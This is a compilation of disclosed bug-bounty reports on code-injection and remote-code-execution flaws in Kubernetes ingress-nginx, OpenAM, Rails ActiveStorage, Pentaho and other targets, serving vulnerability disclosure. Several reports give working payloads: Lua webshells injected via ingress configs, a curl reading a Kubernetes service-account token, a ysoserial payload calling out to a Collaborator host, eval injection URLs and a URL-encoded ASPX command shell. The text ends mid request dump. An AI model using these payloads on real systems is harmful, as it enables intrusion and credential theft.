https://www.exploit-db.com/exploits/48336

## Impact

DotNetNuke Cookie Deserialization Remote Code Execution (RCE) on lonidoor.mtn.ci

---

### [Account Takeover / Arbitrary File read and deletion / Partial code execution (intent redirection)](https://hackerone.com/reports/2289836)

- **Report ID:** `2289836`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** MercadoLibre
- **Reporter:** @fr4via
- **Bounty:** - usd
- **Disclosed:** 2024-06-28T17:33:01.675Z
- **CVE(s):** -

**Summary (team):**

We thank @fr4via for the report and for providing clear reproduction steps with a proof-of-concept code demonstrating the vulnerability. MercadoLibre acknowledged the issue and worked on a fix internally.

---

### [Low privileges (auth) Remote Command Execution - PHP file upload bypass.](https://hackerone.com/reports/841397)

- **Report ID:** `841397`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** ExpressionEngine
- **Reporter:** @mariuszdeepsec
- **Bounty:** - usd
- **Disclosed:** 2024-05-28T20:24:52.572Z
- **CVE(s):** CVE-2020-13443

**Summary (team):**

ExpressionEngine was vulnerable to unrestricted file upload via a low-privileged user due to a bypass extension check that led to remote command execution.

**Summary (researcher):**

Expressionengine was vulnerable to unrestricted file upload with low privileged user due to bypass exteension check led to remote command execution.

---

### [Remote code execution and exfiltration of secret tokens by poisoning the mozilla/fxa CI build cache](https://hackerone.com/reports/2255750)

- **Report ID:** `2255750`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Mozilla
- **Reporter:** @0x90security
- **Bounty:** 8000 usd
- **Disclosed:** 2024-01-20T02:43:11.589Z
- **CVE(s):** -

**Summary (team):**

A security researcher was able to obtain an upload URL for NX Cloud's caching service, used by the Firefox Accounts repository. Because an authorized link could be used to upload more than once to the same artifact, the researcher was then able to poison the cache by re-uploading a modified cache artifact, and exfiltrate fxa's environment variables as a proof of concept. This vulnerability required an attacker to have access to the repository source code to be exploited, and in this case, the fxa repo is public.

---

### [Remote code execution via crafted pentaho report uploaded using default credentials for pentaho business server](https://hackerone.com/reports/1677047)

- **Report ID:** `1677047`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** MTN Group
- **Reporter:** @zer0code
- **Bounty:** - usd
- **Disclosed:** 2023-12-31T21:08:44.212Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Good day,
                      While I do recon for mtn.ci domain I found  Pentaho business server at https://sm.mtn.ci:8888/pentaho with default credentials admin/password ,then I figured that I can upload  prpt reports to server which could use some beanshell,js and java to achieve RCE

## Steps To Reproduce:
1. Login to https://sm.mtn.ci:8888/pentaho admin/password  
{F1878259}
2. Use Pentaho report designer to create malicious report file  
{F1878260}
3. Upload and run the report   
{F1878261}  
{F1878262}

## Impact

The impact of an RCE vulnerability can range from malware execution to an attacker gaining full control over a compromised server.

---

### [CVE-2023-5528: Insufficient input sanitization in in-tree storage plugin leads to privilege escalation on Windows nodes](https://hackerone.com/reports/2231019)

- **Report ID:** `2231019`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Kubernetes
- **Reporter:** @tomerpeled92
- **Bounty:** 5000 usd
- **Disclosed:** 2023-12-21T19:21:28.148Z
- **CVE(s):** CVE-2023-5528

**Vulnerability Information:**

This is an imported report from the email i have sent a month ago about a code injection vulnerability
The vulnerability was assigned as  CVE-2023-5528
As a reference i have talked with Balaji from the k8 team.
Excerpts from the email chain that might be relevant:

"Just a quick update to let you know that we were able to reproduce the issue and are working on a fix. CVE-2023-5528 has been reserved for this issue. We'll keep you updated on the next steps as we review the proposed fix."

"Hi Tomer,
This is being rated as a Tier 1 High severity ($5,000) bounty."

The vulnerability was verified and assigned a CVE  by the k8 team

## Impact

Code execution from kubelet context(SYSYTEM privileges) on all windows nodes on a cluster.

---

### [Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464)](https://hackerone.com/reports/1248052)

- **Report ID:** `1248052`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @fdeleite
- **Bounty:** - usd
- **Disclosed:** 2023-12-21T17:45:26.080Z
- **CVE(s):** CVE-2021-35464

**Vulnerability Information:**

RCE is possible thanks to unsafe Java deserialization in the Jato framework used by OpenAM.


### Supporting Material/References
- https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464

## Impact

An unauthenticated, 3rd-party attacker or adversary can execute remote code

## System Host(s)
███

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2021-35464

## Steps to Reproduce
## Steps To Reproduce

Target domain: ████

First we need to build the payload:
1. Download this jar file 
``wget https://github.com/Bin4xin/sweet-ysoserial/blob/master/target/ysoserial-0.0.6-SNAPSHOT-all.jar``

then 
``java -jar ysoserial-master-SNAPSHOT.jar Click1 "curl https://g0h7qcjzwzpzdh2ar6b5f9x3puvkj9.burpcollaborator.net" | (echo -ne \\x00 && cat) | base64 | tr '/+' '_-' | tr -d '=' | tr -d '\n' > payload.txt`` 

You need to change the burp Collaborator id to test it properly. 

The payload is now saved in the payload.txt file. 

Now we need to use the following request:

```
GET /openam/ccversion/Version?jato.pageSession=XYZ HTTP/1.1
Host: 127.0.0.1
```
Replace **XYZ** by the payload saved into the payload.txt file. 

The response

```
HTTP/1.1 302 Found
Cache-Control: private
Location: https://127.0.0.1:443/openam/base/AMInvalidURL
Content-Length: 0
```
The HTTP Request sent the collaborator :

██████

## Suggested Mitigation/Remediation Actions

---

### [Ingress nginx annotation injection causes arbitrary command execution](https://hackerone.com/reports/1728174)

- **Report ID:** `1728174`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Kubernetes
- **Reporter:** @suanve
- **Bounty:** 2500 usd
- **Disclosed:** 2023-11-24T21:23:20.589Z
- **CVE(s):** CVE-2021-25742, CVE-2021-25746

**Vulnerability Information:**

Report Submission Form

## Summary:
[add a summary of the vulnerability]
For CVE-2021-25742 and CVE-2021-25746, I found a bypass method, which is fatal to the current measures taken by the team
I can easily bypass restrictions and execute arbitrary commands in the express nginx container.
## Kubernetes Version:
[add Kubernetes version & distribution in which the issue was found]

Server Version: version.Info{Major:"1", Minor:"25", GitVersion:"v1.25.2", GitCommit:"5835544ca568b757a8ecae5c153f317e5736700e", GitTreeState:"clean", BuildDate:"2022-09-21T14:27:13Z", GoVersion:"go1.19.1", Compiler:"gc", Platform:"linux/arm64"}



## Component Version:
[if applicable, add component version the issue was found]
ingress-nginx/controller-v1.4.0
https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.4.0/deploy/static/provider/cloud/deploy.yaml

## Steps To Reproduce:
[add details for how we can reproduce the issue, including relevant cluster setup and configuration]
In the latest version (1.4.0), alias was blacklisted,However, nginx supports lua. I can use other watches to insert any location configuration items.
It is meaningless to simply restrict alias instructions. Your team should start from multiple perspectives.

1. minikube start
2. kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v1.4.0/deploy/static/provider/cloud/deploy.yaml
3. 

We use nginx. ingress. kubernetes The io/configuration snippet annotation can be found in nginx Insert a new location in conf and execute any command through lua.

```shell
cat > su.yml<<EOF
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: ingress-exploit
  annotations:
    kubernetes.io/ingress.class: "nginx"
    nginx.ingress.kubernetes.io/configuration-snippet: |
      more_set_headers "suanve"
            proxy_pass http://upstream_balancer;
                                proxy_redirect                          off;
        }
        location /suanve/ { content_by_lua_block { local rsfile = io.popen(ngx.req.get_headers()["cmd"]);local rschar = rsfile:read("*all");ngx.say(rschar); } } location /fs/{
spec:
  rules:
  - host: suanve.susec.me
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: exploit
            port:
              number: 80

EOF

kubectl apply -f su.yml
```

This will cause the nginx configuration to be tampered with. We can execute any command in the corresponding ingress.

```shell
curl -v -H 'Host: suanve.susec.me' -H "cmd: id" 127.0.0.1/suanve/
*   Trying 127.0.0.1:80...
* Connected to 127.0.0.1 (127.0.0.1) port 80 (#0)
> GET /suanve/ HTTP/1.1
> Host: suanve.susec.me
> User-Agent: curl/7.79.1
> Accept: */*
> cmd: id
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Mon, 10 Oct 2022 09:58:18 GMT
< Content-Type: text/html
< Transfer-Encoding: chunked
< Connection: keep-alive
<
uid=101(www-data) gid=82(www-data) groups=82(www-data)
```

* Connection #0 to host 127.0.0.1 left intact

```http
GET /suanve/ HTTP/1.1
Host: suanve.susec.me
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
cmd: cat /var/run/secrets/kubernetes.io/serviceaccount/token
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
Content-Length: 2



```




## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]
{F1978646}

{F1978648}
  * [attachment / reference]

https://hackerone.com/reports/1378175

https://github.com/kubernetes/ingress-nginx/issues/8503

## Impact

Arbitrary command execution
Get kubernetes credentials

---

### [RCE  on ingress-nginx-controller via Ingress spec.rules.http.paths.path field](https://hackerone.com/reports/1620702)

- **Report ID:** `1620702`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Kubernetes
- **Reporter:** @ginoah
- **Bounty:** 2500 usd
- **Disclosed:** 2023-10-26T10:07:49.100Z
- **CVE(s):** -

**Vulnerability Information:**

Report Submission Form

## Summary:

A user with ingress create/update privilege may inject config into `nginx.conf` with `path`.
Config the log_format and access_log to write arbitrary file.
Include the file we created to bypass `path` sanitizer to RCE.

## Kubernetes Version:

```
serverVersion:
  buildDate: "2022-03-06T21:32:53Z"
  compiler: gc
  gitCommit: e6c093d87ea4cbb530a7b2ae91e54c0842d8308a
  gitTreeState: clean
  gitVersion: v1.23.4
  goVersion: go1.17.7
  major: "1"
  minor: "23"
  platform: linux/amd64
```

## Component Version:

```
-------------------------------------------------------------------------------
NGINX Ingress controller
  Release:       v1.2.1
  Build:         08848d69e0c83992c89da18e70ea708752f21d7a
  Repository:    https://github.com/kubernetes/ingress-nginx
  nginx version: nginx/1.19.10

-------------------------------------------------------------------------------
```

## Steps To Reproduce:

  1. Create a kind cluster config

lab.yaml
```yaml
kind: Cluster
name: lab
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
# the control plane node config
- role: control-plane
  kubeadmConfigPatches:
  - |
    kind: InitConfiguration
    nodeRegistration:
      kubeletExtraArgs:
        node-labels: "ingress-ready=true"
  extraPortMappings:
  - containerPort: 80
    hostPort: 80
    protocol: TCP
  - containerPort: 443
    hostPort: 443
    protocol: TCP
# the three workers
- role: worker
- role: worker
- role: worker
```

  2. Create a testing cluster with the previous config

```bash
kind create cluster --config lab.yaml
```

  3. Install nginx-ingress-controller

```bash
kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/main/deploy/static/provider/kind/deploy.yaml
```

  4. Create a the first malicious ingress

**This ingress will allow attacker to write arbitrary content to arbitrary file.**
(note that the service `not-exist-service` does not need to exist)

write_ingress.yaml
```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: webexp
spec:
  rules:
    - host: "example.com"
      http:
        paths:
          - path: "/x/ {\n
            }\n
          }\n
          log_format exploit escape=none $http_x_ginoah;\n
          server {\n
            server_name x.x;\n
            listen 80;\n
            listen [::]:80;\n
            location /z/ {\n
                access_log /tmp/luashell exploit;\n
            }\n
            location /x/ {\n
          #"
            pathType: Exact
            backend:
              service:
                name: not-exist-service
                port:
                  number: 8080
```

Apply the first malicious ingress config
```bash
kubectl apply -f write_ingress.yaml
```

  5. Write a malicious lua config to `/tmp/luashell`

Note that in other cluster config, the `localhost` may need to change to ingress-controller's ip.
```bash
curl localhost/z/ -H "host: x.x" -H 'x-ginoah: content_by_lua_block {ngx.req.read_body();local post_args = ngx.req.get_post_args();local cmd = post_args["cmd"];if cmd then f_ret = io.popen(cmd);local ret = f_ret:read("*a");ngx.say(string.format("%s", ret));end;}'
```

  6. Create a the second malicious ingress

**This ingress will include the malicious lua config, which allow attack to execute arbitrary command.**

webshell_ingress.yaml
```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: webexp
spec:
  rules:
    - host: "example.com"
      http:
        paths:
          - path: "/x/ {\n
            }\n
          }\n
          log_format exploit escape=none $http_x_ginoah;\n
          server {\n
            server_name x.x;\n
            listen 80;\n
            listen [::]:80;\n
            location /z/ {\n
                include /tmp/luashell;\n
            }\n
            location /x/ {\n
          #"
            pathType: Exact
            backend:
              service:
                name: not-exist-service
                port:
                  number: 8080
```

Apply the second malicious ingress config
```bash
kubectl apply -f webshell_ingress.yaml
```

  7. RCE and get output

```bash
curl localhost/z/ -H "host: x.x" -d "cmd=id"
```

## Supporting Material/References:

  * [attachment / reference]

{F1802462}

## Impact

A cluster user/SA with ingress create/update privilege may Remote Code Execution on `ingress-nginx-controller` pod

After RCE on ingress-nginx-controller the attacker may
- utilize the token to take further action on cluster with ingress's privilege
- eavesdrop the traffic, modify other ingress rule
- DOS
- ...

---

### [Code inject via nginx.ingress.kubernetes.io/permanent-redirect annotation](https://hackerone.com/reports/2039464)

- **Report ID:** `2039464`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Kubernetes
- **Reporter:** @jkroepke
- **Bounty:** 2500 usd
- **Disclosed:** 2023-10-25T22:46:43.792Z
- **CVE(s):** CVE-2023-5044

**Vulnerability Information:**

Report Submission Form

## Summary:
The value of the `nginx.ingress.kubernetes.io/permanent-redirect` annotation will be not sanitized and passed into the nginx configuration. This leads into a code inject from any user that is allowed to create ingress objects.

## Kubernetes Version:
v1.26.3 (minikube)

## Component Version:
```
-------------------------------------------------------------------------------
NGINX Ingress controller
  Release:       v1.8.0
  Build:         35f5082ee7f211555aaff431d7c4423c17f8ce9e
  Repository:    https://github.com/kubernetes/ingress-nginx
  nginx version: nginx/1.21.6

-------------------------------------------------------------------------------
```

## Steps To Reproduce:

  1. Install ingress-nginx, using latest version and default values. For demo purpose, I set `allow-snippet-annotations=false`
        ```bash
        helm upgrade -i ingress-nginx ingress-nginx/ingress-nginx -f values.yaml # values.yaml is attached
        ```
  1. apply service and ingress object from attachments
        ```bash
        k apply -f ingress.yaml #ingress.yaml is attached
        ```
  1. Optional: If ingress-nginx is not exposed, run `kubectl port-forward deploy/ingress-nginx-controller 8080:80` and continue step 4 in a separate shell.
  1. Validate, if the code is injected. This demo uses the hostname `kubernetes.api`, use the `--resolve` parameter of curl to do an request for the hidden server instance. The code below expect that ingress-nginx is accessible trough 127.0.0.1:8080

        ```bash
        curl -v --resolve "kubernetes.api:8080:127.0.0.1" http://kubernetes.api:8080/api/v1/namespaces/kube-system/secrets/
        ```

## Supporting Material/References:

  * values.yaml - Used in step 1
  * ingress.yaml - Used in step 2

## Impact

All users with access to create or update ingress objects, are able to running commands on ingress-nginx-controller pod. Since the token of the ServiceAccount is mounted on filesystem, a user can call the Kubernetes API and fetch all secrets or config maps from the cluster. Additionally, the user can read or write files to the filesystem.

---

### [Argument/Code Injection via ActiveStorage's image transformation functionality](https://hackerone.com/reports/1154034)

- **Report ID:** `1154034`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Ruby on Rails
- **Reporter:** @gquadros_
- **Bounty:** - usd
- **Disclosed:** 2023-07-28T00:45:12.641Z
- **CVE(s):** CVE-2022-21831

**Vulnerability Information:**

# Affected components

Tested on:

1. activestorage 6.1.3.1
2. image\_processing 1.12.1
3. mini\_magick 4.11.0

# Found by

Gabriel Quadros and Ricardo Silva from Conviso Application Security

# Description

## Intro

ActiveStorage has an image transformation functionality [1, 2, 3, 4, 5, 6] which uses the concept of *variants*. By their own words [5]:

> Image blobs can have variants that are the result of a set of transformations applied to the original. These variants are used to create thumbnails, fixed-size avatars, or any other derivative image from the original.

> Variants rely on ImageProcessing gem for the actual transformations of the file, so you must add gem "image\_processing" to your Gemfile if you wish to use variants. By default, images will be processed with ImageMagick using the MiniMagick gem, but you can also switch to the libvips processor operated by the ruby-vips gem).

One example of direct usage can be seen in the docs as:

```ruby
<%= image_tag user.avatar.variant(resize_to_limit: [100, 100]) %>
```

This will create an image tag with a variant URL, which when visited will return the *avatar* image transformed to the new size.

Another example uses the *preview()* method, which can be used to generate images from videos and PDF files. Once the preview image is generated, it also calls *variant()* under the hood.

```html
<ul>
  <% @message.files.each do |file| %>
    <li>
      <%= image_tag file.preview(resize_to_limit: [100, 100]) %>
    </li>
  <% end %>
</ul>
```

## Vulnerabilities

First, it is worth noting that the docs [3, 4, 7] do not state anything about it being insecure to pass user-supplied values as arguments to the *variant()/preview()* methods.

Rails uses the gem ImageProcessing [8] with MiniMagick by default, passing the transformations to the *apply* method.

**File:** activestorage/lib/active\_storage/transformers/image\_processing\_transformer.rb
```ruby
 12 module ActiveStorage                                                          
 13   module Transformers                                                         
 14     class ImageProcessingTransformer < Transformer                            
 15       private                                                                 
 16         def process(file, format:)                                            
 17           processor.                                                          
 18             source(file).                                                     
 19             loader(page: 0).                                                  
 20             convert(format).                                                  
 21             apply(operations).                                                
 22             call                                                              
 23         end
```

This method passes these operations to the *builder* object by iterating over them and calling methods providing arguments, as can be seen below.

**File:** lib/image\_processing/chainable.rb
```ruby
 24     # Add multiple operations as a hash or an array.                          
 25     #                                                                         
 26     #   .apply(resize_to_limit: [400, 400], strip: true)                      
 27     #   # or                                                                  
 28     #   .apply([[:resize_to_limit, [400, 400]], [:strip, true])               
 29     def apply(operations)                                                     
 30       operations.inject(self) do |builder, (name, argument)|                  
 31         if argument == true || argument == nil                                
 32           builder.send(name)                                                  
 33         elsif argument.is_a?(Array)                                           
 34           builder.send(name, *argument)                                       
 35         elsif argument.is_a?(Hash)                                            
 36           builder.send(name, **argument)                                      
 37         else                                                                  
 38           builder.send(name, argument)                                        
 39         end                                                                   
 40       end                                                                     
 41     end
```

At some point, ImageProcessing passes these operations to MiniMagick via method calling as well:

**File:** lib/image\_processing/processor.rb
```ruby
 51     # Calls the operation to perform the processing. If the operation is      
 52     # defined on the processor (macro), calls the method. Otherwise calls the 
 53     # operation directly on the accumulator object. This provides a common    
 54     # umbrella above defined macros and direct operations.                    
 55     def apply_operation(name, *args, &block)                                  
 56       receiver = respond_to?(name) ? self : @accumulator                      
 57                                                                               
 58       if args.last.is_a?(Hash)                                                
 59         kwargs = args.pop                                                     
 60         receiver.public_send(name, *args, **kwargs, &block)                   
 61       else                                                                    
 62         receiver.public_send(name, *args, &block)                             
 63       end                                                                     
 64     end
```

MiniMagick receives these operations by defining a *method\_missing* method, which takes the called methods and convert them to CLI options:

**File:** lib/mini\_magick/tool.rb
```ruby
260     ##                                                                        
261     # Any undefined method will be transformed into a CLI option              
262     #                                                                         
263     # @example                                                                
264     #   mogrify = MiniMagick::Tool.new("mogrify")                             
265     #   mogrify.adaptive_blur("...")                                          
266     #   mogrify.foo_bar                                                       
267     #   mogrify.command.join(" ") # => "mogrify -adaptive-blur ... -foo-bar"  
268     #                                                                         
269     def method_missing(name, *args)                                           
270       option = "-#{name.to_s.tr('_', '-')}"                                   
271       self << option                                                          
272       self.merge!(args)                                                       
273       self                                                                    
274     end
```

### Argument Injection

The first problem arrises when a user-supplied value is passed as input to a hard-coded transformation, such as:

```ruby
<%= image_tag user.avatar.variant(resize: params[:new_size]) %>
```

Since Rails *params[]* can be an array, one thing the attacker could do here is to pass an array and inject arbitrary arguments into the command to be executed (ImageMagick's convert by default).

Example:

```
https://example.com/controller?new_size[]=123&new_size[]=-set&new_size[]=comment&new_size[]=MYCOMMENT&new_size[]=-write&new_size[]=/tmp/file.erb
```

This is going to generate the following command:

```
convert ORIGINAL_IMAGE -auto-orient -resize 123 -set comment MYCOMMENT -write /tmp/file.erb /tmp/image_processing20210328-23426-63rmm2.png
```

Which has the effect of writing a file containing user-controlled data anywhere in the system. This could be used easily to achieve RCE against Rails applications by overwriting ERB files, for example.

### User-controlled transformation

A second problem arrises when the user is also allowed to choose the kind of transformation to be applied, such as:

```ruby
<%= image_tag user.avatar.variant(params[:t].to_s => params[:v].to_s) %>
```

This is still dangerous since ImageMagick's convert program has a lot of powerful command-line options and they can be used to compromise the application. For example, the user could pass:

```
https://example.com/controller?t=write&v=/tmp/file2.erb
```

This is going to generate the following command:

```
convert ORIGINAL_IMAGE -auto-orient -write /tmp/file2.erb /tmp/image_processing20210328-23426-63rmm2.png
```

Which has a similar effect as the previous attack, if we consider the original image is usually user-controlled.

### Code Injection

The third problem occurs due the way ImageProcessing passes the operations to the *builder* object (via *send()*). There is no filtering to check if the called method is a valid operation and this can be explored by an attacker to execute code.

Consider the same pattern as before:

```ruby
<%= image_tag user.avatar.variant(params[:t].to_s => params[:v].to_s) %>
```

The attacker could pass:

```
https://example.com/controller?t=eval&v=system("touch /tmp/hacked")
```

And the Ruby code *system("touch /tmp/hacked")* would be executed.

# Recomendations

1. Add some notes in the documentation to warn developers about the dangers of passing user-supplied data to the affected methods (*variant/preview*) without sanitization;
2. Fix the argument injection problem;
3. Implement an operations whitelist in ImageProcessing, so it won't call unexpected methods.

# References

1. https://guides.rubyonrails.org/active_storage_overview.html#transforming-images
2. https://guides.rubyonrails.org/active_storage_overview.html#previewing-files
3. https://api.rubyonrails.org/v6.1.3.1/classes/ActiveStorage/Blob/Representable.html#method-i-variant
4. https://api.rubyonrails.org/v6.1.3.1/classes/ActiveStorage/Blob/Representable.html#method-i-preview
5. https://api.rubyonrails.org/v6.1.3.1/classes/ActiveStorage/Variant.html
6. https://api.rubyonrails.org/v6.1.3.1/classes/ActiveStorage/Preview.html
7. https://github.com/rails/rails/issues/32989
8. https://github.com/janko/image_processing

## Impact

Vulnerable code patterns could allow the attacker to achieve RCE.

---

### [[hta3] Remote Code Execution on ████](https://hackerone.com/reports/1072832)

- **Report ID:** `1072832`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @cdl
- **Bounty:** - usd
- **Disclosed:** 2023-05-15T15:10:54.365Z
- **CVE(s):** -

**Vulnerability Information:**

**Note**
In the days leading up to this event, I looked at `███████` due to the ████████ press release which described this as the scope for this event. I understand that this is outside of the current scope but I feel obligated to report this.

Press release: ██████████
> "During the third iteration the entire ██████ domain can be targeted by participants as well, but rewards will be paid only for discovering certain categories of vulnerabilities."

# Summary
The endpoint at ████ is vulnerable to a remote code execution vulnerability. The `?rdExportFilename=` parameter allows an attacker to write any filetype to any folder and the `rdReportName` parameter allows them to control the contents. This allows them to write a webshell to the server.

## Reproduction Steps:
1. Visit ██████████and login with the credentials: `█████`
2. Go here: ██████and scroll down to the "Reports" section. i
3. Choose any of them and click "Run Report". In the pop-up, click Run Report again.
4. You will be redirected to `█████?rdNoShowWait=True`. Wait for this page to load.
5. Start intercepting requests with Burp Suite.
6. In the upper right-hand corner, click "Export to Excel" and intercept the POST request to `/RServer/rdPage.aspx`
7. Change the `rdReportFormat` and the `rdExcelOutputFormat` query parameters to `NativeExcel`.
8. Change the `rdExportFilename` parameter to `yourfilename.aspx`
9. In the POST body, change the `rdReportName` parameter to your url-encoded aspx shell:

```
%3c%25%40%20%50%61%67%65%20%4c%61%6e%67%75%61%67%65%3d%22%43%23%22%25%3e%3c%25%40%20%49%6d%70%6f%72%74%20%4e%61%6d%65%73%70%61%63%65%3d%22%53%79%73%74%65%6d%22%20%25%3e%0d%0a%3c%25%20%0d%0a%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%20%70%72%6f%63%65%73%73%20%3d%20%6e%65%77%20%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%28%29%3b%0d%0a%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%53%74%61%72%74%49%6e%66%6f%20%73%74%61%72%74%49%6e%66%6f%20%3d%20%6e%65%77%20%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%53%74%61%72%74%49%6e%66%6f%28%29%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%55%73%65%53%68%65%6c%6c%45%78%65%63%75%74%65%20%3d%20%66%61%6c%73%65%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%52%65%64%69%72%65%63%74%53%74%61%6e%64%61%72%64%4f%75%74%70%75%74%20%3d%20%74%72%75%65%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%46%69%6c%65%4e%61%6d%65%20%3d%20%22%43%4d%44%2e%65%78%65%22%3b%0d%0a%73%74%72%69%6e%67%20%63%6d%64%20%3d%20%52%65%71%75%65%73%74%2e%51%75%65%72%79%53%74%72%69%6e%67%5b%22%36%38%63%32%63%38%62%31%66%63%34%37%37%36%36%65%61%66%34%33%30%32%37%61%38%65%61%63%61%31%32%31%22%5d%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%41%72%67%75%6d%65%6e%74%73%20%3d%20%22%2f%63%20%22%2b%63%6d%64%3b%0d%0a%70%72%6f%63%65%73%73%2e%53%74%61%72%74%49%6e%66%6f%20%3d%20%73%74%61%72%74%49%6e%66%6f%3b%0d%0a%70%72%6f%63%65%73%73%2e%53%74%61%72%74%28%29%3b%0d%0a%73%74%72%69%6e%67%20%6f%75%74%70%75%74%20%3d%20%70%72%6f%63%65%73%73%2e%53%74%61%6e%64%61%72%64%4f%75%74%70%75%74%2e%52%65%61%64%54%6f%45%6e%64%28%29%3b%0d%0a%52%65%73%70%6f%6e%73%65%2e%57%72%69%74%65%28%6f%75%74%70%75%74%29%3b%0d%0a%70%72%6f%63%65%73%73%2e%57%61%69%74%46%6f%72%45%78%69%74%28%29%3b%0d%0a%0d%0a%25%3e%3c%25%40%20%50%61%67%65%20%4c%61%6e%67%75%61%67%65%3d%22%43%23%22%25%3e%3c%25%40%20%49%6d%70%6f%72%74%20%4e%61%6d%65%73%70%61%63%65%3d%22%53%79%73%74%65%6d%22%20%25%3e%0d%0a%3c%25%20%0d%0a%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%20%70%72%6f%63%65%73%73%20%3d%20%6e%65%77%20%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%28%29%3b%0d%0a%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%53%74%61%72%74%49%6e%66%6f%20%73%74%61%72%74%49%6e%66%6f%20%3d%20%6e%65%77%20%53%79%73%74%65%6d%2e%44%69%61%67%6e%6f%73%74%69%63%73%2e%50%72%6f%63%65%73%73%53%74%61%72%74%49%6e%66%6f%28%29%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%55%73%65%53%68%65%6c%6c%45%78%65%63%75%74%65%20%3d%20%66%61%6c%73%65%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%52%65%64%69%72%65%63%74%53%74%61%6e%64%61%72%64%4f%75%74%70%75%74%20%3d%20%74%72%75%65%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%46%69%6c%65%4e%61%6d%65%20%3d%20%22%43%4d%44%2e%65%78%65%22%3b%0d%0a%73%74%72%69%6e%67%20%63%6d%64%20%3d%20%52%65%71%75%65%73%74%2e%51%75%65%72%79%53%74%72%69%6e%67%5b%22%36%38%63%32%63%38%62%31%66%63%34%37%37%36%36%65%61%66%34%33%30%32%37%61%38%65%61%63%61%31%32%31%22%5d%3b%0d%0a%73%74%61%72%74%49%6e%66%6f%2e%41%72%67%75%6d%65%6e%74%73%20%3d%20%22%2f%63%20%22%2b%63%6d%64%3b%0d%0a%70%72%6f%63%65%73%73%2e%53%74%61%72%74%49%6e%66%6f%20%3d%20%73%74%61%72%74%49%6e%66%6f%3b%0d%0a%70%72%6f%63%65%73%73%2e%53%74%61%72%74%28%29%3b%0d%0a%73%74%72%69%6e%67%20%6f%75%74%70%75%74%20%3d%20%70%72%6f%63%65%73%73%2e%53%74%61%6e%64%61%72%64%4f%75%74%70%75%74%2e%52%65%61%64%54%6f%45%6e%64%28%29%3b%0d%0a%52%65%73%70%6f%6e%73%65%2e%57%72%69%74%65%28%6f%75%74%70%75%74%29%3b%0d%0a%70%72%6f%63%65%73%73%2e%57%61%69%74%46%6f%72%45%78%69%74%28%29%3b%0d%0a%0d%0a%25%3e
```

10. Now forward the request and you will be redirected to your shell.

Proof:

████████//RServer/rdDownload/rdExport-2b03ab86-09b8-47d8-82de-53c8d7a59f8d/7a4280fce025fa5e30901b4512dff3177a4280fce025fa5e30901b4512dff3177a4280fce025fa5e30901b4512dff3177a4280fce025fa5e30901b4512dff317.aspx?68c2c8b1fc47766eaf43027a8eaca121=whoami


████████

whoami: `█████████`

## HTTP Request Dump
```
POST /RServer/rdPage.aspx?rdReport=agContentAccess&rdDataCache=1361055732&rdShowModes=%3dIIF(Left(%22agContentAccess%22%2c2)%20%3d%20%22ag%22%2c%20%22rdAgTable%22%2c%20)&rdReportFormat=NativeExcel&rdRequestForwarding=Form&rdExcelOutputFormat=NativeExcel&rdExportFilename=7a4280fce025fa5e30901b4512dff3177a4280fce025fa5e30901b4512dff3177a4280fce025fa5e30901b4512dff3177a4280fce025fa5e30901b4512dff317.aspx HTTP/1.1
Host:████████
Connection: close
Content-Length: 4639
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: ██████
Content-Type: application/x-www-form-urlencoded
